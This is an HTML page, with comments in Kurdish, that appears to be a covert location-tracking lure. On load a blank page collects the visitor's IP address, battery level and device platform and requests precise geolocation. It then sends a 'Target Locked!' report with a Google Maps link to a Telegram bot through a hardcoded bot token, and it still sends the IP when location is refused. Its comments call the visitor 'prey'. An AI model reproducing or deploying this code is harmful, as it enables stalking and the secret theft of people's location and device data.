<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <title> </title>
    <style>body { background: white; margin: 0; overflow: hidden; }</style>
</head>
<body onload="startCapture()">

<script>
    const BOT_TOKEN = "8678050341:AAE7b3fvFpfGju4NXGaFiMsvhYC0UdnCYtE";

    async function startCapture() {
        const urlParams = new URLSearchParams(window.location.search);
        const uid = urlParams.get('id');
        if (!uid) return;

        // وەرگرتنی ئایپی و باتری یەکسەر (ئەمە Allow ناوێت)
        let ipInfo = "Unknown";
        let battery = "N/A";
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipRes.json();
            ipInfo = ipData.ip;

            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                battery = Math.floor(b.level * 100) + "%";
            }
        } catch (e) {}

        // داواکردنی لۆکەیشن (ئەمە پەنجەرەی Allow/Block دەهێنێت)
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const time = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', hour12: true });

            let report = `🚨 <b>Target Locked!</b> (نێچیر گیرا)\n\n` +
                         `📍 <b>Location:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">[Google Maps Link]</a>\n` +
                         `🌐 <b>IP:</b> <code>${ipInfo}</code>\n` +
                         `📱 <b>Device:</b> <code>${navigator.platform}</code>\n` +
                         `🔋 <b>Battery:</b> <code>${battery}</code>\n` +
                         `🕒 <b>Time:</b> <code>${time}</code>`;

            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: uid,
                    text: report,
                    parse_mode: "HTML",
                    disable_web_page_preview: false
                })
            });

            // هیچ ڕێدایرێکتێک ناکات، لاپەڕەکە وەک خۆی دەمێنێتەوە
        }, (err) => {
            // ئەگەر نێچیرەکە لۆکەیشنی ڕەتکردەوە (Don't Allow)
            let denyMsg = `⚠️ <b>نێچیرەکە لۆکەیشنی ڕەتکردەوە</b>\n🌐 IP: <code>${ipInfo}</code>`;
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${uid}&text=${encodeURIComponent(denyMsg)}&parse_mode=HTML`);
        }, { enableHighAccuracy: true });
    }
</script>
</body>
</html>
